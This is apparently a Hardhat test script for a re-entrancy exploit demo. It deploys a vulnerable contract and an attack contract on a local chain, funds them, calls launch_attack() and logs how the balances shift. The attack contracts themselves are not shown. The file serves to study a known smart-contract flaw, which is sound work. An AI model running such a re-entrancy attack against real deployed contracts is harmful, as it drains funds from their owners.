const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");
const provider = waffle.provider

describe("Re-entrancy Exploit Demo", function () {
    let accounts;
    let target;
    let exploit;

    before(async () => {
        accounts = await ethers.getSigners();

        const Reentrance = await hre.ethers.getContractFactory("Reentrance");
        target = await Reentrance.deploy();
      
        // console.log("Reentrance deployed to:", target.address);
      
        const ReentranceExploit = await hre.ethers.getContractFactory("ReentranceExploit");
        exploit = await ReentranceExploit.deploy();
      
        // console.log("ReentranceExploit deployed to:", exploit.address);
    })

  it("Exploits the contract", async function () {
  
    const account = accounts[0];

    // console.log("How much balance Victim Contract Has ", await provider.getBalance(target.address));
    

    await account.sendTransaction({to:target.address, value:ethers.utils.parseEther("100"), gasLimit:ethers.utils.hexlify(300000)});
    // await account.sendTransaction({to:exploit.address, value:ethers.utils.parseEther("1")});



    
    // await exploit.deposit().sendTransaction({to:exploit.address, value:ethers.utils.parseEther("1"), data:target.address});
    // console.log("How much balance Attack Contract Has before exploit is run ", parseInt(await provider.getBalance(exploit.address)));
    
    await exploit.deposit(target.address, {value:ethers.utils.parseEther("1")});

    // console.log(await target.getBalance(exploit.address))
    

    console.log("How much balance Victim Contract Has before exploit is run", parseInt(await provider.getBalance(target.address)));
    console.log("How much balance Attack Contract Has before exploit is run ", parseInt(await provider.getBalance(exploit.address)));
    console.log("")
    await exploit.launch_attack();
    console.log("How much balance Victim Contract Has after the exploit is run", parseInt(await provider.getBalance(target.address)));
    console.log("How much balance Attack Contract Has after the exploit is run ", parseInt(await provider.getBalance(exploit.address)));

  })
});
